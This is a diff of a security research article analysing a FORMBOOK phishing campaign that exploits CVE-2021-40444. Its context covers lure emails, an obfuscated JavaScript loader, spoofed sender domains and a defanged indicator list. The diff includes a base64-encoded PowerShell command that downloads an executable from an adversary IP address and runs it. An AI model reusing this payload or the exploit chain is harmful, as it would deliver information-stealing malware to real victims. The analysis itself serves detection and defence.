@@ -1,7 +1,7 @@
 ---
 title: FORMBOOK Adopts CAB-less Approach
 description: "Campaign research and analysis of an observed FORMBOOK intrusion attempt"
-summary_blog: ""
+summary_blog: "https://www.elastic.co/blog/identifying-exploits-and-adversary-tradecraft-of-formbook-information-stealing-campaign"
 date: 2022-01-18
 tags:
   - FORMBOOK
@@ -72,7 +72,7 @@ mitigating workarounds could be deployed [[1](https://github.com/aslitsecurity/C
 [[4](https://kentosec.com/2021/09/12/cve-2021-40444-poc-demonstration/)],
 [[5](https://github.com/Edubr2020/CVE-2021-40444--CABless)], [[6](https://twitter.com/vxunderground/status/1436326057179860992?s=20)].
 
-Additionally, this highlights the maturity of the exploit development community — underscoring the importance of
+Additionally, this highlights the maturity of the exploit development community --- underscoring the importance of
 proactive measures (like network and endpoint monitoring, anti-spam/phishing countermeasures, email MIME-type
 attachment policies, etc.) and an exercised patch management strategy.
 
@@ -84,7 +84,7 @@ configuration, as well as a more clever "CABless" approach. Our telemetry observ
 the CABless approach. We describe these in detail below.
 
 We initiated several collection techniques simultaneously, including searching for malicious attachments that would be
-included in phishing emails — one of the most common mechanisms for distributing exploit code. We noticed that not many
+included in phishing emails --- one of the most common mechanisms for distributing exploit code. We noticed that not many
 malicious email attachments had been reported, and by October 28, 2021, we were only able to identify four instances of
 this exploit leveraged with email. In addition to the four instances of the exploit, we observed the threat actor
 attempting to leverage a generic phishing approach with the FORMBOOK malware as an attachment.
@@ -102,7 +102,7 @@ The next following sections will break down these different campaign sightings a
 
     1. _A major challenge for the campaign is to get a DLL file onto the victim system_
     2. _ActiveX controls are DLL files with special constraints_
-    3. _Web pages can link ActiveX controls directly or load files that are contained in a URL — this is not
+    3. _Web pages can link ActiveX controls directly or load files that are contained in a URL --- this is not
         recommended by Microsoft because file signatures cannot be validated_
 
 ### Testing phase
@@ -201,7 +201,7 @@ The above figure shows the notable section of the obfuscated JavaScript code. We
 of the lookup functions (shown commented out with `//`'s). This revealed the `classid` (`CLSID:edbc374c-5730-432a-b5b8-de94f0b57217`)
 attribute which appears across the web in various other malware analyses of CVE-2021-40444. This suggests with moderate
 confidence that this JavaScript was crafted using some repurposed code that has been open-sourced. The `classid` attribute
-is used to determine if `comres.cab` has already been downloaded — if it has, it won't attempt to download it again.
+is used to determine if `comres.cab` has already been downloaded --- if it has, it won't attempt to download it again.
 
 Once `comres.cab` is downloaded and extracted, the extracted file must be located. This is why there are multiple directory
 execution attempts observed in JavaScript. All the work up to this point is to get the DLL (`IEcache.inf`) onto the filesystem.
@@ -312,7 +312,7 @@ and Generic phases.
 ### Production phase
 
 The second, third, and fourth sightings all had the same sender field of `admin0011[@]issratech.com` and included a
-single attachment — `Profile.rar` file — to deliver the second stage malware.
+single attachment --- `Profile.rar` file --- to deliver the second stage malware.
 
 ![Production phase lure email](media/production-phase-lure-email.png "Production phase lure email")
 
@@ -346,7 +346,8 @@ Decoding this string, we can see that a file called `abb01.exe` is downloaded an
 This is the same IP address we have observed across all Testing and Production phases.
 
 ```bash title="Decoded PowerShell command"
-echo "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADQANAAuADcAOAAuADEANwA3AC8AYQBiAGIAMAAxAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIAKQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIA" | base64 -D
+echo "aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwADQALgAyADQANAAuADcAOAAuADEANwA3AC8AYQBiAGIAMAAxAC4AZQB4AGUAIgAsACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIAKQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwAZABsAGwAaABvAHMAdABTAHYAYwAuAGUAeABlACIA"\
+ | base64 -D
 ```
 
 ```powershell title="Resulting powershell output (defanged)
@@ -535,7 +536,7 @@ The companies all had international footprints in:
 * Industrial Mechanical Engineering and Manufacturing, HQ in Germany (Generic phase)
 
 While the targeted companies are of note (in that they are in the same vertical), an email address domain observed in
-all three phases — `issratech[.]com`, appears similar to a legitimate Jamaican company domain, `isratech[.]com`, a business
+all three phases --- `issratech[.]com`, appears similar to a legitimate Jamaican company domain, `isratech[.]com`, a business
 that specializes in irrigation, wastewater management, and solar energy. Below, is a screenshot of `issratech[.]com` using
 the default CyberPanel landing page. CyberPanel is a web hosting tool for WordPress sites.
 
@@ -547,7 +548,7 @@ valuable to an Isratch project listed on their projects page ([https://www.israt
 * Chemical: Waste-water treatment, dairy production sanitation
 * Extruded aluminum: Solar array scaffolding, greenhouses
 
-Two additional email address domains were observed in the Generic phase — one appears to be mimicking a legitimate
+Two additional email address domains were observed in the Generic phase --- one appears to be mimicking a legitimate
 medical equipment manufacturer (`backjoy[.]com`) and the other (`leonei[.]com`) appears to be adversary controlled,
 but seemingly not being used for legitimate purposes.
 
@@ -695,4 +696,3 @@ Indicator                                                          | Type       
 `212[.]192[.]241[.]173`                                            | ipv4-addr   |                         | IP address of backsjoy[.]com
 `52[.]128[.]23[.]153`                                              | ipv4-addr   |                         | IP address of leonei[.]com
 `104[.]244[.]78[.]177`                                             | ipv4-addr   |                         | Adversary controlled IP address
-
